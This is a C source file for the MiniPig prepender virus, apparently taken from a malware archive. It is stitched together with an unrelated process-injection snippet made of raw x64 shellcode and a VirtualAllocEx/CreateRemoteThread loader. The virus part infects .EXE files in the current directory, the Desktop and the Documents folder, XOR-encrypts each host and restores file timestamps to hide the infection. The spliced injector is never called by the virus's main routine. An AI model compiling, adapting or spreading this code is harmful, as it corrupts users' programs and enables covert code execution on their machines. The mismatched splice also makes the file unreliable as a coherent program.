/************************************************************************************
 * This is my new prepender virus ... its name is MiniPig.                          *
 * It works in simple way, nothing of new, look at code.                            *
 * It will infect current directory, desktop and Personal folder ... This could be  *
 * buggy so if you find some bugs you can contact me at: wargame89@yahoo.it         *
 * I declared the virus size as string so you can modify it in an hex-editor ...    *
 * Pay attenction to this value !!!                                                 * 
 * P.S: I tested this only under WinXP and Win98 ... bye :)                         *
 * https://github.com/ytisf/theZoo/blob/master/malware/Source/Original/Win32.MiniPig_Nov2006/ *
 ************************************************************************************/
#include <windows.h>
#include <stdio.h>



#include<TlHelp32.h>
#include<string.h>


char shellcode[]="\x4d\x31\xc0\x41\x50\x41\x50\xc7\x04\x24\x65\x78\x70\x6c\xc7\x44\x24\x04\x6f\x72\x65\x72\xc7\x44\x24\x08\x2e\x65\x78\x65\x48\x8d\x0c\x24\x41\x50\x41\x50\x41\x50\xc7\x04\x24\x43\x3a\x5c\x55\xc7\x44\x24\x04\x73\x65\x72\x73\xc7\x44\x24\x08\x5c\x50\x75\x62\xc7\x44\x24\x0c\x6c\x69\x63\x5c\xc7\x44\x24\x10\x69\x6e\x2e\x64\x66\xc7\x44\x24\x14\x6c\x6c\x48\x8d\x14\x24\x66\x41\xb8\x50\x01\x4c\x29\xc4\x4c\x8d\x24\x24\x6a\x18\x41\x58\x49\x89\x0c\x24\x49\x89\x54\x24\x08\x4d\x89\x44\x24\x10\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\xb2\x88\x8b\x5f\x3c\x48\x01\xfb\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x99\x52\x66\xba\x40\x03\x8b\x1c\x96\x48\x01\xfb\xc7\x04\x24\x6d\x73\x76\x63\x66\xc7\x44\x24\x04\x72\x74\x48\x8d\x0c\x24\x48\x83\xec\x58\xff\xd3\x48\x8d\x54\x24\x58\xc7\x02\x73\x74\x72\x63\x66\xc7\x42\x04\x6d\x70\x48\x89\xc1\x66\x41\xb8\x2c\x09\x42\x8b\x1c\x06\x48\x01\xfb\xff\xd3\x49\x89\x44\x24\x18\x66\xba\xf8\x02\x8b\x1c\x16\x48\x01\xfb\x48\x31\xd2\x6a\x02\x59\xff\xd3\x49\x89\xc5\x49\x83\xfd\xff\x74\x60\x66\xba\x30\x01\x41\x89\x54\x24\x20\x66\xba\x60\x0e\x8b\x1c\x16\x48\x01\xfb\x49\x8d\x54\x24\x20\x4c\x89\xe9\xff\xd3\x48\x83\xf8\x01\x75\x3d\x48\x31\xd2\x66\xba\x68\x0e\x44\x8b\x3c\x16\x49\x01\xff\x48\x83\xec\x58\x49\x8d\x4c\x24\x4c\x49\x8b\x14\x24\x49\x8b\x5c\x24\x18\xff\xd3\x48\x31\xd2\x48\x39\xd0\x74\x24\x4c\x89\xe9\x49\x8d\x54\x24\x20\x41\xff\xd7\x48\x83\xf8\x01\x74\xd7\xc9\xc3\x48\x31\xd2\x52\x66\xba\xa4\x04\x8b\x1c\x16\x48\x01\xfb\x59\xff\xd3\x48\x31\xd2\x52\x41\x5a\x66\x41\xba\x0c\x0e\x42\x8b\x1c\x16\x48\x01\xfb\x52\x59\x45\x8b\x44\x24\x28\xb9\x0a\x80\x84\x1e\x81\xe9\x0b\x70\x65\x1e\xff\xd3\x49\x89\xc5\x49\x83\xfd\xff\x74\xc0\x66\xba\xff\x04\x8b\x1c\x96\x48\x01\xfb\x48\x83\xec\x58\x4c\x89\xe9\x48\x31\xd2\x4d\x8b\x44\x24\x10\x66\x41\xb9\xff\x2f\x49\xff\xc1\xc6\x44\x24\x20\x04\xff\xd3\x49\x89\xc6\x48\x31\xd2\x48\x39\xd0\x74\x8d\x66\xba\x43\x05\x8b\x1c\x96\x48\x01\xfb\x48\x83\xec\x58\x48\x31\xd2\x48\x89\x54\x24\x20\x4c\x89\xe9\x4c\x89\xf2\x4d\x8b\x44\x24\x08\x4d\x8b\x4c\x24\x10\xff\xd3\x48\x83\xf8\x01\x0f\x85\x5b\xff\xff\xff\x66\xba\xa8\x02\x8b\x1c\x16\x48\x01\xfb\x48\x31\xd2\x48\x83\xec\x58\x4c\x89\xe9\x52\x52\x41\x58\x66\xba\x40\x03\x44\x8b\x0c\x96\x49\x01\xf9\x5a\x4c\x89\x74\x24\x20\x4c\x89\x44\x24\x28\x4c\x89\x44\x24\x30\xff\xd3\xe8\x21\xff\xff\xff";


void inject(DWORD );
int poc(int i,char *a[])
{
	if(i!=2)
	{
		printf("Usage %s <program name>",a[0]);
		return 0;
	}

	BOOL f=0;
	HANDLE snap;
	PROCESSENTRY32 pe32;

	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() Failed."); return 0;
	}

	pe32.dwSize=sizeof(pe32);

	if(!Process32First(snap,&pe32))
	{
		printf("Process32First() Failed."); return 0;
	}



	do
	{
		if(0==strncmp(a[1],pe32.szExeFile,strlen(pe32.szExeFile)))
		{
			f=TRUE;
			break;
		}

	}while(Process32Next(snap,&pe32));


	if(!f)
	{
		printf("No infomation found about \"%s\" ",a[1]);
	}
	else
	{
		printf("Program name:%s\nProcess id: %d",pe32.szExeFile,pe32.th32ProcessID);
		printf("\nInjecting shellcode");
		inject(pe32.th32ProcessID);
	}



	return 0;

}



void inject(DWORD pid)
{
	HANDLE phd,h;
	LPVOID shell;

	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

	if(phd==INVALID_HANDLE_VALUE)
	{
		printf("\nOpenProcess() Failed."); return ;
	}

	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(shell==NULL)
	{
		printf("\nVirtualAllocEx() Failed"); return ; CloseHandle(phd);
	}

	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
	printf("\nInjection successfull\n");
	printf("Running Shellcode......\n");

	h=CreateRemoteThread(phd,NULL,2046,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
	if(h==NULL)
	{
		printf("Failed to Run Shellcode\n"); return ;
	}
}

/* This is the signature of an infected file */
#define MINIPIG_SIGNATURE "MiniPig by [WarGame,#eof]"
/* The length of the signature string ! */
#define MINIPIGSIGNATURE_LEN 26
/* This is the key used for xor encryption */
#define XoR 0x4a
/* This will contain the original virus code */
static char *VirusBody = NULL;
/* Original virus size ( Compressed with upx using -9 option )*/
static char *Str_VirSize = "16384"; 
static DWORD VirusSize;       

       /* This it the infection routine */
void Infects(void) 
{
	WIN32_FIND_DATA w32; /* Used by FindFirstFile() and FindNexFile() */
	HANDLE SearchFD = NULL; /* Search handle */
	HANDLE EXE_FD = NULL; /* File handle */
	char *VictimBuf = NULL; /* This is the buffer used in I/O operations */
	char Signature[MINIPIGSIGNATURE_LEN]; /* Used to check signature */
	DWORD readbytes,writtenbytes; /* Used by WriteFile() and ReadFile(); */
	DWORD VictimAttributes; /* Attributes of victim */
	FILETIME WriteTime,LastAccessTime,CreationTime; /* Used to restore victim's time */
	DWORD CryptCnt; /* Used in crypting loop */

		if((SearchFD = FindFirstFile("*.EXE",&w32)) == INVALID_HANDLE_VALUE) 
        {
			return;
		}

		do
		{
			 /* Let's open the found executable! */
			if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
			{
				/* Checks it it has already been infected */
				      SetFilePointer(EXE_FD,-(MINIPIGSIGNATURE_LEN),0,FILE_END);
                      memset(Signature,0,MINIPIGSIGNATURE_LEN);
				/* Reads ( possible ) signature */
					  ReadFile(EXE_FD,Signature,MINIPIGSIGNATURE_LEN,&readbytes,NULL);
                      
				/* Already infected !!! */
					  if(strstr(Signature,MINIPIG_SIGNATURE)) 
					  {
						  CloseHandle(EXE_FD);
						  continue;
					  }
				
				/* Infects it !!! */
					  else 
					  {
						  /* Saves old attributes */
						  VictimAttributes = w32.dwFileAttributes;
						  CopyMemory(&WriteTime,&w32.ftLastWriteTime,sizeof(FILETIME));
						  CopyMemory(&CreationTime,&w32.ftCreationTime,sizeof(FILETIME));
						  CopyMemory(&LastAccessTime,&w32.ftLastAccessTime,sizeof(FILETIME));
					      
						  /* Grows up the victim's size */
                           SetFilePointer(EXE_FD,MINIPIGSIGNATURE_LEN+VirusSize,0,FILE_CURRENT);
						   SetEndOfFile(EXE_FD);
						  /* Closes the file */
						   CloseHandle(EXE_FD);

						   /* Reopens the file */
                           if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
						   {
                                /* Failed to allocate memory ! */
							    if((VictimBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,w32.nFileSizeLow)) == NULL) 
								{
									CloseHandle(EXE_FD);
									continue;
								}
								
								else 
								{
									/* Ok Now we read victim on buffer */
									ReadFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&readbytes,NULL);
									/* Ok overwrites with virus */
									SetFilePointer(EXE_FD,-(w32.nFileSizeLow),0,FILE_CURRENT);
									WriteFile(EXE_FD,VirusBody,VirusSize,&writtenbytes,NULL);
									 
									/* Crypts VictimBuf with simple XoR */
									for(CryptCnt = 0;CryptCnt < w32.nFileSizeLow;CryptCnt++)
									{
										VictimBuf[CryptCnt] ^= XoR;
									}
									
									/* Ok writes the victim at the end */
                                    WriteFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&writtenbytes,NULL);
									/* Writes the signature */
									WriteFile(EXE_FD,MINIPIG_SIGNATURE,MINIPIGSIGNATURE_LEN,&writtenbytes,NULL);
									/* Restores victim's file and attributes */
									SetFileAttributes(w32.cFileName,VictimAttributes);
									SetFileTime(EXE_FD,&CreationTime,&LastAccessTime,&WriteTime);
									/* Closes All and frees memory */
									CloseHandle(EXE_FD);
									GlobalFree(VictimBuf);
									/* DONE ! */
								}
						   }
						  
					  }
			}
		}while(FindNextFile(SearchFD,&w32));

		/* Closes the search */
		FindClose(SearchFD);
}

/* This is used to return to host */
void ReturnToHost(char *mypath) 
{
       HANDLE TotalFD; /* This is the handle used to read the entire file */
       char *TotalBuf = NULL; /* Put the file here */
	   DWORD TotalSize; /* Total size of file */
	   HANDLE HostFD; /* Used to write host's code */
	   DWORD readbytes,writtenbytes; /* As usual ... :) */
	   DWORD DecryptCnt; /* Used for decrypting */
	   char *randChars = "AcGh9Kl6"; /* Used for random name generation */
	   char randName[10]; /* Random name for temp host */
	   STARTUPINFO inf_prog; /* Used for CreateProcess() */
       PROCESS_INFORMATION info_pr; /* the same ... :) */
	          
	   /* Reads entire file */
	    if((TotalFD = CreateFile(mypath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
		{
			/* What is the size of mine ??? */
			TotalSize = GetFileSize(TotalFD,NULL);
			
			/* Allocates memory */
			if((TotalBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,TotalSize)) == NULL) 
			{
				ExitProcess(0);
			}

			/* Reads and puts in buffer */
			ReadFile(TotalFD,TotalBuf,TotalSize,&readbytes,NULL);
			/* Closes file */
			CloseHandle(TotalFD);
			
			/* Builds random name */
			srand(GetTickCount());
            sprintf(randName,"%c%c%c%c%c%c.exe",randChars[rand()%8],randChars[rand()%8],
				randChars[rand()%8],randChars[rand()%8],randChars[rand()%8],randChars[rand()%8]);
			
			/* Creates the temp host file */
			if((HostFD = CreateFile(randName,GENERIC_WRITE,FILE_SHARE_WRITE,NULL
				  ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN,NULL)) != INVALID_HANDLE_VALUE) 
			{
				
				/* Decrypts !!! */
                for(DecryptCnt = VirusSize;DecryptCnt < TotalSize;DecryptCnt++)
				{
					TotalBuf[DecryptCnt] ^= XoR;
				}
				/* Hosts written! */
				SetFilePointer(HostFD,0,0,FILE_BEGIN);
				WriteFile(HostFD,TotalBuf+VirusSize,(TotalSize-VirusSize),&writtenbytes,NULL);
				/* Frees and closes */
				CloseHandle(HostFD);
				GlobalFree(TotalBuf);
				
				/* Returns to host ! */
				memset(&inf_prog,0,sizeof(STARTUPINFO));
                memset(&info_pr,0,sizeof(PROCESS_INFORMATION));
                inf_prog.cb = sizeof(STARTUPINFO);
                inf_prog.dwFlags = STARTF_USESHOWWINDOW;
                inf_prog.wShowWindow = SW_SHOW;

				/* Runs host ! */
				CreateProcess(NULL,randName,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,
                             &inf_prog,&info_pr);
				
				/* Waits and deletes tmp exe */
				WaitForSingleObject(info_pr.hProcess,INFINITE);
				DeleteFile(randName);
				
				/* Exits ! */
				ExitProcess(0);
			}
		}

			else
			{
				ExitProcess(0);
			}
}

/* This is to get special folder */
int GetSpecialFolder(char *path,char *folder) 
{
	HKEY hKey; /* Reg handle */
	DWORD len = MAX_PATH;

	memset(path,0,MAX_PATH);
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",0,KEY_QUERY_VALUE,&hKey) !=
                 ERROR_SUCCESS)
                    {
	                       return 0; /* failed :( */
                    }
  
	/* Puts found path in path buffer */
	if(RegQueryValueEx(hKey,folder,0,NULL,path,&len) != ERROR_SUCCESS)
                    {
		                   RegCloseKey(hKey);
                           return 0;
                    }

	/* Success ! */
	RegCloseKey(hKey);
	return 1;
}

/* The main of virus */
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char MyPath[MAX_PATH];
	HANDLE VirFD = NULL; /* Used to read virus body */
	DWORD readbytes; /* As usual used by ReadFile() */
	DWORD CurrentSize; /* Current size of proggy */
	char CWD[MAX_PATH],OriginalCWD[MAX_PATH]; /* Used to change directory */

	/* Gets its path */
	 GetModuleFileName(NULL,MyPath,MAX_PATH);

	/* Gets its current directory */
	 GetCurrentDirectory(MAX_PATH,OriginalCWD);

	/* Gets Virus Size */
	 VirusSize = atoi((char *)Str_VirSize);
	 
	/* Puts virus body in VirusBody buffer */
	 if((VirFD = CreateFile(MyPath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
	 {
          if((VirusBody = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,VirusSize)) == NULL) 
		  {
			  ExitProcess(0);
		  }

		  /* Reads virus body and puts it in VirusBody */
		  ReadFile(VirFD,VirusBody,VirusSize,&readbytes,NULL);
		  /* Gets the total file size */
		  CurrentSize = GetFileSize(VirFD,NULL);
		  /* Closes virus's handle */
		  CloseHandle(VirFD);
				
	 }

	  /* Error !!! Exits !!! */
	 else 
	 {
		 ExitProcess(0);
     }
	 
	 /* Infects current dir */
	 Infects();

     /* Infects desktop */
	 if(GetSpecialFolder(CWD,"Desktop"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }

	 /* Infects personal folder ( usually named Documents ) */
	 if(GetSpecialFolder(CWD,"Personal"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }
	 
	 
	 /* If we are not in the first generation we return to host ! */
     if(CurrentSize > VirusSize) 
     {
	 SetCurrentDirectory(OriginalCWD);
	 ReturnToHost(MyPath);
	 }
}